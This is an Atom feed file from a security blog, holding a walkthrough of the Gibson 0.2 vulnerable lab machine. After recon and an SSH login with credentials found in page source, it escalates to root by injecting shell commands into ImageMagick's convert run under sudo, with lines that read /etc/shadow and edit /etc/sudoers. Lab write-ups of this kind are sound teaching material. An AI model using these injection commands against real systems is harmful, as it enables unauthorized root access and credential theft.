@@ -1,0 +1,133 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: imagemagick | Bob1Bob2]]></title>
+  <link href="http://wg135.github.io/blog/categories/imagemagick/atom.xml" rel="self"/>
+  <link href="http://wg135.github.io/"/>
+  <updated>2017-01-25T13:58:13-06:00</updated>
+  <id>http://wg135.github.io/</id>
+  <author>
+    <name><![CDATA[Bob1Bob2]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Gibson:0.2]]></title>
+    <link href="http://wg135.github.io/blog/2016/07/21/gibson-0-dot-2/"/>
+    <updated>2016-07-21T09:20:22-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/07/21/gibson-0-dot-2</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+</ul>
+
+
+<h3>Vulnerability:</h3>
+
+<p><a href="https://www.exploit-db.com/exploits/39767/">ImageMagick &lt;= 6.9.3-9 / &lt;= 7.0.1-0 - Multiple Vulnerabilities </a></p>
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/gibson/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.196 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.196 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/gibson/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 22 and 80 are opening.</p>
+
+<p>use wfuzz to scan</p>
+
+<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.196/FUZZ 2&gt;/dev/null
+</code></pre>
+
+<p>Nothing cool come out.</p>
+
+<p>check the webpage, find a file <code>davinci.htm</code>. Double click it.</p>
+
+<p><img src="/images/blog/vulhub/gibson/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Not useful</p>
+
+<p><img src="/images/blog/vulhub/gibson/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the souce code:</p>
+
+<p><img src="/images/blog/vulhub/gibson/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Get a potential username/password <code>margo</code>:<code>god</code>.</p>
+
+<p>login ssh:</p>
+
+<p><img src="/images/blog/vulhub/gibson/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the shell.</p>
+
+<p>Now lets try to get root</p>
+
+<p><code>sudo -l</code></p>
+
+<p><img src="/images/blog/vulhub/gibson/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>try to execute this program</p>
+
+<p><img src="/images/blog/vulhub/gibson/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>ImageMagick ????</p>
+
+<p><code>searchsploit ImageMagick</code></p>
+
+<p><img src="/images/blog/vulhub/gibson/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>I used that exploit.</p>
+
+<p><code>convert 'https://example.com"|ls "-la' out.png</code></p>
+
+<p><img src="/images/blog/vulhub/gibson/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>works</p>
+
+<p><img src="/images/blog/vulhub/gibson/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now try:</p>
+
+<p><code>sudo convert 'https://example.com"|cat "/etc/shadow' out.png</code></p>
+
+<p><img src="/images/blog/vulhub/gibson/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now</p>
+
+<p>modify the <code>/etc/sudoers</code></p>
+
+<p><code>sudo convert 'https://example.com"|vim "/etc/sudoers' out.png</code></p>
+
+<p><img src="/images/blog/vulhub/gibson/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>save and quit.</p>
+
+<p>ssh to the box as margo,</p>
+
+<p><code>sudo su</code></p>
+
+<p><img src="/images/blog/vulhub/gibson/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Game Over</p>
+]]></content>
+  </entry>
+  
+</feed>
